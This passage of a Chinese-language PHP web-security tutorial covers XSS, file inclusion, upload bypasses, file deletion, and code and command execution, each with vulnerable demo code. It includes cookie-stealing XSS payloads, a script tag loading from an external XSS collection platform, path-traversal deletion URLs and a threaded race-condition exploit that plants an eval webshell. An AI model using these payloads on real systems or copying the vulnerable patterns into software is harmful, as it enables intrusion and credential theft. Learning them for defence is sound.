数据流向: 浏览器-> 后端-> 数据库-> 后端-> 浏览器

eg:

```mysql
create table xss (
    id int(10) unsigned NOT NULL AUTO_INCREMENT,
    payload varchar(100) NOT NULL,
    PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8;
```

storagexss.php(test on mysql 5.5.38)

```php
\\存储XSS演示
<form action="" method="post">
    <input type="text" name="xss"/>
    <input type="submit" value="test"/>
</form>
<?php
$xss=@$_POST['xss'];
mysql_connect("localhost","root","root");
mysql_select_db("test");
if($xss!==null){
    $sql="insert into xss(id,payload) values(1,'$xss')";
    $result=mysql_query($sql);
    echo $result;
}
?>
```

storagexsshow.php(test on mysql 5.5.38)

```php
<?php
mysql_connect("localhost","root","root");
mysql_select_db("test");
$sql="select payload from xss";
$result=mysql_query($sql);
while($row=mysql_fetch_array($result)){
    echo $row['payload']; 
}
?>
```

storagexss.php post:`<img src=x onerror=alert(document.cookie)>`
访问storagexsshow.php会弹出cookie

恶意利用(以评论区存在存储型xss为例):假如某网站评论区存在xss存储行漏洞,攻击者在评论中插入获取cookie的代码,当每个用户看到此评论时,他们的cookie都会被发送到攻击者服务器。

### DOM型

没有经过后端,只在前端触发。

数据流向是：URL-->浏览器 

eg:

domxss.php(test on mysql 5.5.38)

```php
<?php
error_reporting(0); //禁用错误报告
$q = $_GET["q"];
?>
<form action="" method="get">
    <input type="text" name="q" id='text' value="<?php echo $q;?>" />
    <input type="submit" value="test"/>
</form>
<div id="print"></div>
<script type="text/javascript">
var text = document.getElementById("text"); 
var print = document.getElementById("print");
print.innerHTML = text.value + ' not found'; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。
</script>
```

`http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E`

恶意利用和反射型xss类似

### 实例

以ESPCMS P8.18101601n 前台XSS为例，问题主要由于错误页面的报错信息未作过滤，造成XSS漏洞。

payload:`http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&at=List&tid=7`

### 防范

- 特殊字符HTML实体编码
- 标签黑白名单(推荐白名单,黑名单可能存在不可预测的绕过)
- 请求头设置HttpOnly属性(cookie不能通过js调用获取)

### XSS 平台使用简要教程

#### 找一个xss接收平台，并完成注册等一系列操作

这里以 <https://xsshs.cn/> 做例子

![12BSxg.png](https://s2.ax1x.com/2020/02/07/12BSxg.png)

登陆平台

#### 创建和配置项目

![12B9MQ.png](https://s2.ax1x.com/2020/02/07/12B9MQ.png)

![12BCrj.png](https://s2.ax1x.com/2020/02/07/12BCrj.png)

填写好项目名称和描述（自定义）

然后进行配置：

![120Oat.png](https://s2.ax1x.com/2020/02/07/120Oat.png)

比如这里我们需要获取管理员的cookie，就勾上![120LVI.png](https://s2.ax1x.com/2020/02/07/120LVI.png)

点击下一步

就会进入到项目代码，注意，上面的代码都是已经封装好的了，包括接收url什么的，我们直接使用就可以了。

#### 使用

![120I2D.png](https://s2.ax1x.com/2020/02/07/120I2D.png)

比如我们随便挑一个最简单的来使用

```js
<sCrIpt srC=//xs.sb/boJN></sCRipT>
```

我们以C1CTF的xss题目来做例子

![120Hrd.png](https://s2.ax1x.com/2020/02/07/120Hrd.png)

将代码复制到你觉得可能会产生xss的地方，这里点提交后，保存了在一个页面

![1204PK.png](https://s2.ax1x.com/2020/02/07/1204PK.png)

当有用户（带cookie）访问这个页面的时候，此用户的cookie就会被获取并且发送到我们的平台，一般来说我们需要admin的cookie。这题的逻辑是直接发送页面id让管理员检查

![120vPf.png](https://s2.ax1x.com/2020/02/07/120vPf.png)

然后就等着接收就可以了。

#### 接收

在平台里的项目内容里就可以查看到xss的结果了

![120xG8.png](https://s2.ax1x.com/2020/02/07/120xG8.png)

### 收集常见的XSS payload

[Cross-Site-Scripting-Payloads](https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html)

## 文件操作漏洞

总的来说时因为没有经过严格的验证,操作的文件是否在允许的范围内。

危害:

- 导致恶意文件/代码包含
- 导致敏感文件被读取
- 导致文件被删除
- 导致恶意文件上传

### 文件包含

文件包含分为本地文件包含(local file include)、远程文件包含(remote file include)。文件包含可以导致恶意代码被包含,从而获取webshell

文件包含利用函数:

- include(即使文件被包含过,也会再次包含,包含文件遇到错误代码也会继续执行)
- include_once(文件被包含过了,就不会再次包含,包含文件遇到错误也会继续执行)
- require(即使文件被包含过,也会再次包含,包含文件遇到错误程序直接退出)
- require_once(文件被包含过了,就不会再次包含,包含文件遇到错误程序直接退出)
- ...

本地文件包含(LFI):

只能包含本机文件,大多出现在模块加载、模板加载和cache调用等地方。
本地文件包含方式也有多种,比如上传一个允许上传的文件格式的文件在包含,包含PHP上传的临时文件,webserver记录到日志后在包含webserver的日志,linux下可以包含/proc/self/environ文件等。

eg:
localfileinclude.php(test on php 5.5.38)

```php
<?php
define("ROOT",dirname(__FILE__).'/');
$mod = $_GET['mod'];
echo ROOT.$mod.'.php';
include(ROOT.$mod.'.php');
?>
```

lfishell.php

```php
<?php
echo phpinfo();
?>
```

`http://127.0.0.1/localfileinclude.php?mod=lfishell`

远程文件包含:

可以包含远程文件。需要设置allow_url_include=on。支持http、ftp、php伪协议、zip、file等协议。

eg:

remotefileinclude.php

```php
<?php
include($_GET['url']);
?>
```

使用python开启一个见到的服务器:
`python -m SimpleHTTPServer 8080`

rfi.txt

```php
<?php
echo phpinfo();
?>
```

`http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt`

使用伪协议(举两个伪协议例子):

php://input

- allow_url_fopen：off/on
- allow_url_include：on
  `http://127.0.0.1/remotefileinclude.php?url=php://input`
  `post: <?php phpinfo();?>`

php://filter

- allow_url_fopen：off/on
- allow_url_include：off/on
  `http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php`

截断包含:

00截断(受限于GPC和addslashes等函数影响,php5.3之后也不能使用这个方法,不过现在很少有这个漏洞了):

```php
<?php
include $_GET['a'].'.php';
?>
```

假如你发现了截断包含漏洞,然后又只能上传某些固定后缀的文件,那可以试下00截断

`http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00`

多个`.`和`/`截断,不受GPC限制,但是在php5.3之后修复

### 文件读取(下载)

程序在下载文件或者读取显示文件的时候,读取文件的参数直接在请求中传递,后台程序获取到这个文件后直接读取返回,问题在于这个参数是用户可控的,可以直接传入想要的文件路径。

文件读取或者下载函数:

- file_get_contents
- high_light
- fopen
- readfile
- fread
- ...

eg:



```php
<?php
$file = file_get_contents($_GET['file']);
echo $file;
?> 
```

`http://127.0.0.1/fileread.php?file=aaa.txt`

### 文件上传漏洞

如果能把文件上传到管理员或者应用程序不想让你上传的目录,那么就存在文件上传漏洞。

一般的检测流程:

- 客户端javascript校验（一般只校验文件的扩展名）
- 服务端校验
  - 文件头content-type字段校验（image/gif）
  - 文件内容头校验（GIF89a）
  - 目录路经检测（检测跟Path参数相关的内容）
  - 文件扩展名检测 (检测跟文件 extension 相关的内容)
  - 后缀名黑名单校验
  - 后缀名白名单校验
  - 自定义正则校验
- WAF设备校验（根据不同的WAF产品而定）

利用函数:

- move_uploaded_file

### 客户端校验

jsupload.php (test on php 5.5.38)

```php
<?php
//文件上传漏洞演示脚本之js验证
$uploaddir = 'uploads/';
if (isset($_POST['submit'])) {
    if (file_exists($uploaddir)) {
        if (move_uploaded_file($_FILES['upfile']['tmp_name'], $uploaddir . '/' . $_FILES['upfile']['name'])) {
            echo '文件上传成功，保存于：' . $uploaddir . $_FILES['upfile']['name'] . "\n";
        }
    } else {
        exit($uploaddir . '文件夹不存在,请手工创建！');
    }
    //print_r($_FILES);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"

    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=gbk"/>
    <meta http-equiv="content-language" content="zh-CN"/>
    <title>文件上传漏洞演示脚本--JS验证实例</title>
    <script type="text/javascript">
        function checkFile() {
            var file = document.getElementsByName('upfile')[0].value;
            if (file == null || file == "") {
                alert("你还没有选择任何文件，不能上传!");
                return false;
            }
            //定义允许上传的文件类型
            var allow_ext = ".jpg|.jpeg|.png|.gif|.bmp|";
            //提取上传文件的类型
            var ext_name = file.substring(file.lastIndexOf("."));
            //alert(ext_name);
            //alert(ext_name + "|");
            //判断上传文件类型是否允许上传
            if (allow_ext.indexOf(ext_name + "|") == -1) {
                var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
                alert(errMsg);
                return false;
            }
        }
    </script>
<body>
<h3>文件上传漏洞演示脚本--JS验证实例</h3>


<form action="" method="post" enctype="multipart/form-data" name="upload" onsubmit="return checkFile()">
    <input type="hidden" name="MAX_FILE_SIZE" value="204800"/>
    请选择要上传的文件：<input type="file" name="upfile"/>
    <input type="submit" name="submit" value="上传"/>
</form>
</body>
</html>
```

`http://127.0.0.1/jsupload.php`

判断方式：
在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。

绕过方法：
将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp
上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firebug之类的插件把它禁掉）

### 服务端检测

#### MIME类型检测

MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。

eg:

```php
<?php
if($_FILES['file']['type'] != "image/jpg")
{
    echo "Sorry, we only allow uploading GIF images";
    exit;
}
$uploaddir = './uploads/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
{
    echo "File is valid, and was successfully uploaded.\n";
} else {
    echo "File uploading failed.\n";
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"

    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=gbk"/>
    <meta http-equiv="content-language" content="zh-CN"/>
<body>


<form action="" method="post" enctype="multipart/form-data" name="upload">
    <input type="hidden" name="MAX_FILE_SIZE" value="204800"/>
    请选择要上传的文件：<input type="file" name="upfile"/>
    <input type="submit" name="submit" value="上传"/>
</form>
</body>
</html>
```

绕过方法:
配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型

#### 扩展名检测

黑名单检测:

```php
<?php
function getExt($filename){
    //sunstr - 返回字符串的子串
    //strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）
    return substr($filename,strripos($filename,'.')+1);
}
if($_FILES["file"]["error"] > 0)
{
    echo "Error: " . $_FILES["file"]["error"] . "<br />";
}
else{
    $black_file = explode("|","php|jsp|asp");//允许上传的文件类型组
    $new_upload_file_ext = strtolower(getExt($_FILES["file"]["name"])); //取得被.隔开的最后字符串
    if(in_array($new_upload_file_ext,$black_file))
    {
        echo "文件不合法";
        die();
    }
    else{
        $filename = basename($_FILES['file']['name']).".".$new_upload_file_ext;
        if(move_uploaded_file($_FILES['file']['tmp_name'],"uploads/".$filename))
        {
            echo "Upload Success";
        }
    }
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"

    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=gbk"/>
    <meta http-equiv="content-language" content="zh-CN"/>
<body>


<form action="" method="post" enctype="multipart/form-data" name="upload">
    <input type="hidden" name="MAX_FILE_SIZE" value="204800"/>
    请选择要上传的文件：<input type="file" name="upfile"/>
    <input type="submit" name="submit" value="上传"/>
</form>
</body>
</html>
```

apache服务器可能做了配置不会解析特殊扩展名
使用其他服务器复现(我使用的nginx),上传php4扩展名绕过黑名单
`http://127.0.0.1/uploads/shell.php4`

白名单检测:
仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止

绕过方法：

- 文件名大小写绕过
  - 用像 AsP，pHp 之类的文件名绕过黑名单检测
- 名单列表绕过
  - 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类
- 特殊文件名绕过
  - 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性
- 0x00截断
  - 文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中(php版本需要小于5.3.4,magic_quotes_gpc=Off)

#### 文件内容检测

文件头检测:

- JPG: FF D8 FF E0 00 10 4A 46 49 46
- GIF: 47 49 46 38 39 61 (GIF89a)
- PNG: 89 50 4E 47
  绕过方法:
  添加头对应的文件头伪造

文件相关信息检测:

- 检查图片大小、尺寸等的信息。
  绕过方法:
  将代码注入到正常文件中(比如图片马:copy /b 1.jpg+2.php)

#### 竞争上传

当文件上传到服务器,先暂时保存,在检查是不是符合条件,如果不符合再删掉。
利用思路就是我们用多线程不断上传.php文件,在某个没有被删除的时刻如果访问到了.php文件,就生成一个shell,shell就会存到服务器。

eg:

competionupload.php(test on php 5.5.38)

```php
<?php
if ($_POST['submit']){
    $allowtype = array("gif","png","jpg");
    $size = 10000000;
    $path = "./uploads/";
    $filename = $_FILES['file']['name'];
    if(is_uploaded_file($_FILES['file']['tmp_name'])){
        if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
            die("error:can not move");
        }
    }else{
        die("error:not an upload file！");
    }
    $newfile = $path.$filename;
    echo "file upload success.file path is: ".$newfile."\n<br />";
    if($_FILES['file']['error']>0){
        unlink($newfile);
        die("Upload file error: ");
    }
    $ext = array_pop(explode(".",$_FILES['file']['name']));
    if(!in_array($ext,$allowtype)){
        unlink($newfile);
        die("error:upload the file type is not allowed，delete the file！");
    }
}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"

    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=gbk"/>
    <meta http-equiv="content-language" content="zh-CN"/>
<body>


<form action="" method="post" enctype="multipart/form-data" name="upload">
    <input type="hidden" name="MAX_FILE_SIZE" value="204800"/>
    请选择要上传的文件：<input type="file" name="file"/>
    <input type="submit" name="submit" value="上传"/>
</form>
</body>
</html>
```

exp.py

```python
import os
import requests
import threading
import random
import string

exp_name = ''.join(random.sample(string.ascii_letters + string.digits,10))
shell_name = ''.join(random.sample(string.ascii_letters + string.digits,10))

# 按照自己的环境修改url
upload_url = 'http://127.0.0.1/competionupload.php'
exp_url = 'http://127.0.0.1/uploads/{}.php'.format(exp_name)
shell_url = 'http://127.0.0.1/uploads/{}.php'.format(shell_name)

exp_content = ('<?php fputs(fopen("{}.php", "w"), '
               '\'<?php @eval($_POST["qqq"]) ?>\'); ?>')
exp_content = exp_content.format(shell_name)

def upload():
    while True:
        print('[+] upload file...')
        data = {'submit':'上传'}
        files = {"file":('{}.php'.format(exp_name),exp_content)}
        resp = requests.post(upload_url,files=files,data=data)

def get():
    while True:
        print('[+] get shell file...')
        requests.get(exp_url)
        resp = requests.get(shell_url)
        if resp.status_code == 200:
            print('[*] create {}.php success'.format(shell_name))
            os._exit(0)

def main():
    threads = []

    try:
        # 线程数也可以自己修改,我这里只是开太多线程本地服务器扛不住
        for i in range(3):
            t = threading.Thread(target=get,args=())
            threads.append(t)
            t.start()

        for i in range(5):
            t = threading.Thread(target=upload,args=())
            threads.append(t)
            t.start()        

        for thread in threads:
            thread.join()
    except Exception as e:
        print(str(e))

if __name__ == "__main__":
    main()
```

可以参考[上面讲了19种情景的bypass方法](http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/)

### 文件删除

文件删除漏洞出现在有文件管理功能的应用上很多,这些应用一般都有文件上传和读取等功能。漏洞利用原理和文件读取差不多,只是利用函数不一样。一般是因为删除文件的文件名可以用../跳转,或者没有限制当前用户只能删除他该有权限删除的文件。php中这个漏洞函数通常是unlink()

eg:

```php
<?php
$basedir = './uploads/';
if(isset($_GET['action']) && $_GET['action'] == 'delete'){
    $filename = isset($_GET['filename'])?$_GET['filename']:'';
    if($filename){
        unlink($basedir.$filename);
    }
}
?>
```

`http://127.0.0.1/filedelete.php?action=delete&filename=../../../../../../../test.txt`

### 防范

通用防范:

- 对权限管理要合理,比如用户A上传的文件,不能被同权限的B用户删除。特殊文件操作需要特权用户才能操作,比如后台删除文件的操作,肯定需要限制管理员才能操作。
- 有的文件操作不需要直接传入文件名,比如下载文件时,可以将文件名、路径、ID(MD5形式)及文件上传用户存入数据库中,操作时根据文件ID和当前用户名去判断当前用户有没有权限操作改文件。
- 避免目录跳转。禁止`..`、`/`、`\`来跳转目录

## 代码执行

代码执行漏洞指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行。这种漏洞如果没有进行特殊过滤,相当于一个web后门的存在。

php中导致该漏洞的函数:

- eval
- assert
- preg_replace
- call_user_func
- call_user_func_array
- array_map
- php动态函数($a($b))
- ...

eval()和assert()函数导致的代码执行漏洞大多数是因为载入缓存或者模板以及对变量的处理不严格导致,比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成php代码执行。

eg:

```php
<?php
function action_a(){
    echo 'call action_a method';
}
function action_b(){
    echo 'call action_b method';
}
$a = $_GET['m'];
eval('action_'.$a.'();');
?>
```

`http://127.0.0.1/codexec_eval.php?m=b`

`http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//`



preg_replace()函数(__php5.5之前可用__)导致代码执行需要存在`/e`参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签及文章内容过滤等地方。

eg:

```php
<?php
$html_body = '<a {${phpinfo()}}></a>';
var_dump(preg_replace("#(</?)(\w+)([^>]*>)#e",
              '"\\1".strtoupper("\\2")."\\3"',$html_body));
?>
```

`http://127.0.0.1/codexec_preg.php`



由于php特性的原因，php函数可以直接由字符串拼接，导致动态执行函数。

eg:

```php
<?php
$_GET['a']($_GET['b']);
?>
```

`http://127.0.0.1/codexec_dynfunc.php?a=assert&b=phpinfo()`

还有其他函数，可以自行查阅

实际环境中可以结合正则表达式使用白名单对参数过滤

## 命令执行

代码执行是指可以执行代码，命令执行是可以执行系统命令(比如CMD或者BASH命令)。php命令执行是继承webserver用户权限。

php命令执行函数:

- system
- exec
- shell_exec
- passthru
- pcntl_exec
- popen
- proc_popen
- \`

eg:

```php
<?php
system('whoami');
popen('whoami >> ./aaa.txt','r');
echo `whoami`;
?>
```

防范

- 使用escapeshellcmd、escapeshellarg防止命令注入
- 参数白名单